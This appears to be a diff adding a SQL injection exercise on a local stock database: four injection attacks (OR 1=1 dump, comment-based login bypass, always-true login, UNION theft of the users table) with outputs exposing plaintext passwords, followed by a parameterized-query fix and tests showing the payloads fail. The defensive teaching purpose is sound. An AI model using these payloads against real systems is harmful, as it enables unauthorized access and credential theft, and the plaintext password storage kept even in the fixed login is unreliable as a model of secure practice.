@@ -62,3 +62,69 @@ Query G:
 UPDATE products SET price = 38000 WHERE id = 1;
 SELECT * FROM products;
 Output: [(1, 'Cement', 38000, 'Building material'), (2, 'Iron Sheets', 25000, 'Roofing'), (3, 'Paint', 15000, 'White gloss')]
+
+
+
+
+=== Attack 1: Dump all products ===
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+=== Attack 2: Login bypass ===
+Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
+Result: (1, 'admin', 'admin123', 'admin')
+
+=== Attack 3: Always true login ===
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result: (1, 'admin', 'admin123', 'admin')
+
+=== Attack 4: UNION attack ===
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (1, 'admin', 'admin123', 'admin'), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (2, 'fatuma', 'pass456', 'attendant'), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (3, 'wasswa', 'pass789', 'manager'), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+
+
+import sqlite3
+
+# Connect to your database file
+conn = sqlite3.connect('nyondo_stock.db')
+
+# Secure search using parameterized query
+def search_product_safe(name):
+    query = "SELECT * FROM products WHERE name LIKE ?"
+    # Add wildcards around the name safely
+    rows = conn.execute(query, (f"%{name}%",)).fetchall()
+    print(f"Query: {query} | Param: {name}")
+    print(f"Result: {rows}\n")
+    return rows
+
+## Secure login using parameterized query
+def login_safe(username, password):
+    query = "SELECT * FROM users WHERE username=? AND password=?"
+    row = conn.execute(query, (username, password)).fetchone()
+    print(f"Query: {query} | Params: ({username}, {password})")
+    print(f"Result: {row}\n")
+    return row
+
+# Tests: all of these should return [] or None
+print('Test 1:', search_product_safe("' OR 1=1--"))
+print('Test 2:', search_product_safe("' UNION SELECT id,username,password,role FROM users--"))
+print('Test 3:', login_safe("admin'--", 'anything'))
+print('Test 4:', login_safe("' OR '1'='1", "' OR '1'='1"))
+
+Query: SELECT * FROM products WHERE name LIKE ? | Param: ' OR 1=1--
+Result: []
+
+Test 1: []
+Query: SELECT * FROM products WHERE name LIKE ? | Param: ' UNION SELECT id,username,password,role FROM users--
+Result: []
+
+Test 2: []
+Query: SELECT * FROM users WHERE username=? AND password=? | Params: (admin'--, anything)
+Result: None
+
+Test 3: None
+Query: SELECT * FROM users WHERE username=? AND password=? | Params: (' OR '1'='1, ' OR '1'='1)
+Result: None
+
+Test 4: None
